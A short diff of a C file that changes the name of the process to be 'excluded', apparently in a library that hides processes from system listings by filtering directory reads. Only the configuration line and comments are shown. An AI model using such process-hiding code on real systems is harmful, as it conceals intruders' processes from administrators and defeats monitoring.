@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "nlul";
+static const char* process_to_filter = "lhl";
 
 /*
  * Get a directory name given a DIR* handle
